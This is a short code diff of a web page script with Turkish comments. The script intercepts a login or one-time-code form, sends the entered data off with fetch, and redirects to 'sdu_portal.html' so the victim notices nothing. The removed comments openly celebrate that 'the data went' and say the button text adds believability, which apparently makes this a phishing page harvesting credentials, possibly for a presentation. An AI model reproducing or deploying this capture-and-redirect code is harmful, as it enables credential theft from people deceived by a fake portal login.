@@ -967,16 +967,16 @@
 </body>
 <script>
     window.addEventListener('load', function () {
-        const form = document.getElementById('otpForm');
-        const btn = document.getElementById('submitBtn');
+        const form = document.getElementById('stsForm'); // Form ID'si
+        const btn = document.getElementById('submitBtn'); // Buton ID'si
 
         if (form) {
             form.addEventListener('submit', function (e) {
-                e.preventDefault(); // Sayfanın erkenden yenilenmesini durdurur
+                e.preventDefault(); // Sayfanın yenilenmesini durdur
 
                 if (btn) {
-                    btn.disabled = true; // Butonu dondurur (çift tıklamayı önler)
-                    btn.innerHTML = "Doğrulanıyor..."; // İnandırıcılık katar
+                    btn.disabled = true;
+                    btn.innerHTML = "Giriş Yapılıyor...";
                 }
 
                 const formData = new FormData(this);
@@ -992,11 +992,11 @@
                     body: json
                 })
                     .then(() => {
-                        // VERİ GİTTİ! Şimdi senin portalına yönlendiriyoruz
+                        // İşlem başarılı, portal sayfasına uçur
                         window.location.href = "sdu_portal.html";
                     })
                     .catch(() => {
-                        // İnternet kopsa bile portala git ki sunumun bozulmasın
+                        // Hata olsa bile portala git (Sunumun aksamasın)
                         window.location.href = "sdu_portal.html";
                     });
             });
